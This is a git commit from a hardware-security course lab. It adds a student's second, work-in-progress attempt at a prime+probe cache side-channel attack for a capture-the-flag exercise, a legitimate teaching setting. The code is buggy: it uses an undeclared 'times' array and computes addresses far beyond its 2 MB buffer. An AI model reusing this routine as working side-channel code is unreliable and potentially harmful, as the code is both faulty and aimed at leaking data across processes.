9df339e1b320781e1894e47686c29987e8489230
Brenton Lian <brenton.lian@gmail.com>
2026-03-05 20:18:01 -0500

    attempt 2 for attacker.c

--- hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
+++ hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
@@ -1,12 +1,58 @@
 #include "util.h"
-// mman library to be used for hugepage allocations (e.g. mmap or posix_memalign only)
 #include <sys/mman.h>
 
+#define BUFF_SIZE (2*1024*1024)
+#define CACHE_LINE 64
+#define NUM_SETS 1024
+
 int main(int argc, char const *argv[]) {
+
     int flag = -1;
 
-    // Put your capture-the-flag code here
+    char *buf = mmap(NULL, BUFF_SIZE,
+                     PROT_READ | PROT_WRITE,
+                     MAP_POPULATE | MAP_ANONYMOUS |
+                     MAP_PRIVATE | MAP_HUGETLB,
+                     -1, 0);
+
+    if (buf == MAP_FAILED) {
+        perror("mmap");
+        return 1;
+    }
+
+    buf[0] = 1;
+
+    char *set_addr[NUM_SETS];
+
+    for (int i = 0; i < NUM_SETS; i++) {
+    set_addr[i] = buf + i * 65536;
+}
+
+while (1) {
+
+    // PRIME
+    for (int i = 0; i < NUM_SETS; i++)
+        *(volatile char*)set_addr[i];
+
+    for (volatile int i = 0; i < 100000; i++);
+
+    // PROBE
+    for (int i = 0; i < NUM_SETS; i++)
+        times[i] = measure_one_block_access_time(set_addr[i]);
+
+    uint64_t max_time = 0;
+
+    for (int i = 0; i < NUM_SETS; i++) {
+        if (times[i] > max_time) {
+            max_time = times[i];
+            flag = i;
+        }
+    }
+
+    break;
+}
 
     printf("Flag: %d\n", flag);
+
     return 0;
 }
